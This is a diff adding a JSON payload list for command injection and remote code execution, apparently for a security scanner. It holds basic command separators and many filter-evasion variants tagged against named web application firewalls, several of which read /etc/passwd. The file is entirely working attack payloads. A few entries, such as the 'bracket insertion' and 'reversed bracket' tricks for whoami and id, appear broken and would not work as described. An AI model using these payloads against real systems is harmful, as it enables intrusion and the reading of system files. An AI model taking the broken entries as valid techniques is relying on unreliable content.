@@ -1,0 +1,311 @@
+{
+    "vulnerability_type": "RCE",
+    "description": "Remote Code Execution / Command Injection payloads with WAF bypass variants",
+    "payloads": [
+        {
+            "payload": "; id",
+            "description": "Basic semicolon command separator",
+            "context": "command_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "semicolon"
+            ]
+        },
+        {
+            "payload": "| id",
+            "description": "Pipe command chaining",
+            "context": "command_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "pipe"
+            ]
+        },
+        {
+            "payload": "|| id",
+            "description": "OR operator command chaining",
+            "context": "command_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "or"
+            ]
+        },
+        {
+            "payload": "& id",
+            "description": "Background operator command chaining",
+            "context": "command_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "background"
+            ]
+        },
+        {
+            "payload": "&& id",
+            "description": "AND operator command chaining",
+            "context": "command_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "and"
+            ]
+        },
+        {
+            "payload": "$(id)",
+            "description": "Command substitution",
+            "context": "command_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "substitution"
+            ]
+        },
+        {
+            "payload": "`id`",
+            "description": "Backtick command substitution",
+            "context": "command_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "backtick"
+            ]
+        },
+        {
+            "payload": ";{id,}",
+            "description": "Brace expansion command execution",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "cloudflare"
+            ],
+            "tags": [
+                "brace_expansion",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "$IFS",
+            "description": "Internal Field Separator as space alternative",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity",
+                "aws_waf"
+            ],
+            "tags": [
+                "ifs",
+                "space_bypass",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": ";cat$IFS/etc/passwd",
+            "description": "IFS space bypass for cat",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity",
+                "aws_waf"
+            ],
+            "tags": [
+                "ifs",
+                "space_bypass",
+                "cat",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": ";cat${IFS}/etc/passwd",
+            "description": "IFS in braces for space bypass",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "akamai"
+            ],
+            "tags": [
+                "ifs",
+                "braces",
+                "space_bypass",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": ";{cat,/etc/passwd}",
+            "description": "Brace expansion with comma as space",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity",
+                "imperva"
+            ],
+            "tags": [
+                "brace_expansion",
+                "space_bypass",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": ";cat%09/etc/passwd",
+            "description": "Tab character as space alternative",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "aws_waf"
+            ],
+            "tags": [
+                "tab",
+                "space_bypass",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": ";c'a't /etc/passwd",
+            "description": "Single quote keyword breaking",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity",
+                "akamai"
+            ],
+            "tags": [
+                "quote_break",
+                "keyword_bypass",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": ";c\"a\"t /etc/passwd",
+            "description": "Double quote keyword breaking",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity"
+            ],
+            "tags": [
+                "quote_break",
+                "keyword_bypass",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": ";c\\at /etc/passwd",
+            "description": "Backslash keyword breaking",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "aws_waf",
+                "imperva"
+            ],
+            "tags": [
+                "backslash",
+                "keyword_bypass",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": ";/???/??t /etc/passwd",
+            "description": "Wildcard glob for /bin/cat",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "akamai",
+                "modsecurity",
+                "imperva"
+            ],
+            "tags": [
+                "glob",
+                "wildcard",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": ";$(printf '\\x63\\x61\\x74') /etc/passwd",
+            "description": "Hex-encoded command via printf",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity",
+                "aws_waf"
+            ],
+            "tags": [
+                "hex_encode",
+                "printf",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": ";w]h[o]a[m]i",
+            "description": "Bracket insertion in command name",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity"
+            ],
+            "tags": [
+                "bracket",
+                "keyword_bypass",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "$({cat,/etc/passwd})",
+            "description": "Subshell brace expansion",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "akamai",
+                "imperva"
+            ],
+            "tags": [
+                "subshell",
+                "brace_expansion",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "echo${IFS}$(cat${IFS}/etc/passwd)",
+            "description": "Nested IFS substitution",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity"
+            ],
+            "tags": [
+                "ifs",
+                "nested",
+                "substitution",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": ";a]i[d",
+            "description": "Reversed bracket trick for command 'id'",
+            "context": "command_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "cloudflare"
+            ],
+            "tags": [
+                "bracket",
+                "keyword_bypass",
+                "waf_bypass"
+            ]
+        }
+    ]
+}
